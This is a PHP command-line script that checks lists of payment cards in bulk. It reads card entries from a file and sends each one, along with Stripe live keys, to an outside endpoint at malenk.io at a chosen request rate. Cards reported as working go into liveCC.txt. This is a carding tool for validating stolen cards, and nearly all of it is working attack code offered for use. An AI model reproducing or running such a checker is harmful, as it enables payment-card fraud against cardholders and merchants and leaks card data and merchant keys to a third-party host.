<?php
date_default_timezone_set("Asia/Jakarta");
require("RollingCurl/RollingCurl.php");
$config = ['sk_live' => 'sk_live',
           'pk_live' => 'pk_live'];
$initiateRepeat = 0;
do {
  $pathFile = input("Path File List");
  if(empty($pathFile)) {
    $initiateRepeat = 1;
  } else if(!file_exists($pathFile)) {
    $initiateRepeat = 1;
  } else {
    $initiateRepeat = 0;
  }
} while($initiateRepeat);


$delimeter = explode("\n", trim(file_get_contents($pathFile)));
$checkTotal = 1;
$amountList = count($delimeter);
$urlList = array();
foreach($delimeter as $formList) {
  $urlList[] = "http://malenk.io/stripe/?format=".trim($formList)."&sk_live=".$config['sk_live']."&pk_live=".$config['pk_live'];
}

$reqPerSec = input("Request Per Seconds (Recomended: 10-20)");
$rollingCurl = new \RollingCurl("callback");
$rollingCurl->window_size = $reqPerSec;

foreach($urlList as $url) {
  $request = new RollingCurlRequest($url);
  $rollingCurl->add($request);
}

$rollingCurl->execute();


function callback($response, $info) {
  global $checkTotal, $amountList;
  $format = json_decode($response,1)['card']['number']."|".json_decode($response,1)['card']['exp_month']."|".json_decode($response,1)['card']['exp_year']."|".json_decode($response,1)['card']['cvv'];
  if(json_decode($response,1)['status'] == "LIVE") {
      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => LIVE\n";
      file_put_contents("liveCC.txt", $format."\n", FILE_APPEND);
  } else {
      echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => ".json_decode($response,1)['status']." ".json_decode($response,1)['message']."\n";
      if(json_decode($response,1)['status'] !== "DIE" || json_decode($response,1)['status'] !== "LIVE") {
        file_put_contents("unk.txt", $format."\n", FILE_APPEND);
      }
  }
  $checkTotal++;
}

function input($text) {
  echo $text.": ";
  $a = trim(fgets(STDIN));
  return $a;
}

?>
